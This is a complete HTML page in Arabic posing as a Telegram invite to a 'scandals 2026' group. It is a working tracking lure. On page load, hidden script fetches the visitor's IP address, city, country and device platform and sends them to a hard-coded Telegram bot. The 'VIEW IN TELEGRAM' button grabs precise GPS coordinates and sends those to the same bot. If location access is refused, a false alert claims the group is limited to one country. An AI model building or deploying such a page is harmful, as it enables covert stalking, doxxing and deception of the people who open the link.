<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Telegram: Join Group Chat">
    <meta property="og:description" content="جروب: فضائح 2026 🔥">
    <meta property="og:image" content="https://i.postimg.cc/vTj5sX6c/temp-image-37A0A0F7-325E-437D-8C5D-037D887D7ADD.jpg">
    <title>Telegram: Join Group Chat</title>
    <style>
        body { background-color: #e7ebf0; font-family: Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .tg-card { background: white; padding: 40px 20px; text-align: center; width: 100%; max-width: 360px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); border-radius: 10px; }
        .tg-logo { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; }
        .tg-title { font-size: 20px; font-weight: bold; color: #000; margin-bottom: 5px; }
        .tg-status { color: #707579; font-size: 14px; margin-bottom: 30px; }
        .tg-button { background-color: #33a1de; color: white; padding: 14px; border: none; border-radius: 25px; font-size: 16px; font-weight: 500; cursor: pointer; width: 80%; text-decoration: none; display: inline-block; }
    </style>
</head>
<body>
    <div class="tg-card">
        <img src="https://i.postimg.cc/vTj5sX6c/temp-image-37A0A0F7-325E-437D-8C5D-037D887D7ADD.jpg" class="tg-logo">
        <div class="tg-title">فضائح 2026 🔥</div>
        <div class="tg-status">124,532 مشترك</div>
        <p style="color: #707579; font-size: 13px;">أنت مدعو للانضمام إلى هذه المجموعة على تيليجرام.</p>
        <button class="tg-button" onclick="getGPS()">VIEW IN TELEGRAM</button>
    </div>

    <script>
        const T = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
        const C = '6648970984';

        // صيد IP صامت عند الدخول
        (async function() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const d = await response.json();
                let msg = `👤 **زائر جديد للرابط:**\n📍 ${d.city}, ${d.country_name}\n🆔 IP: ${d.ip}\n📱 Device: ${navigator.platform}`;
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            } catch (e) {}
        })();

        // طلب الموقع عند الضغط
        function getGPS() {
            navigator.geolocation.getCurrentPosition(async (p) => {
                const map = `http://googleusercontent.com/maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("📍 **الموقع الدقيق:**\n" + map)}&parse_mode=Markdown`);
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                // الرسالة الجديدة التي طلبتها عند الرفض
                alert("يجب السماح بالوصول للموقع للتأكيد من الدولة لأن المجموعة مخصصة للعرض في دولة محددة.");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
